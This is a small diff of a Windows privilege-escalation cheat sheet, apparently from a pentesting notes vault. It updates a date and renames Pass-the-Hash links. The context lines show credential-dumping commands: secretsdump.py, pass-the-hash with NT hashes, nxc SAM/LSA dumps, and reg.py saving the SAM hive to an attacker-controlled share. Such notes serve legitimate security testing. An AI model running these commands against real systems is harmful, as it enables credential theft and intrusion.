@@ -1,6 +1,6 @@
 ---
 created: 2026-09-04
-updated: 2026-09-20
+updated: 2026-10-11
 tags:
   - Windows
   - Windows_PrivEsc
@@ -112,7 +112,7 @@ secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
 secretsdump.py <domain>/<username>:<password>@<target>
 ```
 
-- Authenticate using an NT hash ([[🛠️ Pass-the-Hash]]):
+- Authenticate using an NT hash ([[Pass-the-Hash]]):
 
 ```bash
 secretsdump.py -hashes :<NT_hash> <domain>/<username>@<target>
@@ -151,7 +151,7 @@ reg.py <domain>/<username>:<password>@<target> save -keyName 'HKLM\SAM' -o '\\<a
 reg.py <domain>/<username>:<password>@<target> backup -o '\\<attacker_ip_address>\<share_name>'
 ```
 
-- Authenticate using an NT hash ([[🛠️ Pass-the-Hash]]):
+- Authenticate using an NT hash ([[Pass-the-Hash]]):
 
 ```bash
 reg.py -hashes :<NT_hash> <domain>/<username>@<target> backup -o '\\<attacker_ip_address>\<share_name>'
@@ -195,7 +195,7 @@ nxc smb <target> -u <username> -p <password> --lsa
 nxc smb <target> -u <username> -p <password> --local-auth --sam --lsa
 ```
 
-- Authenticate using an NT hash ([[🛠️ Pass-the-Hash]]):
+- Authenticate using an NT hash ([[Pass-the-Hash]]):
 
 ```bash
 nxc smb <target> -u <username> -H <NT_hash> --sam --lsa
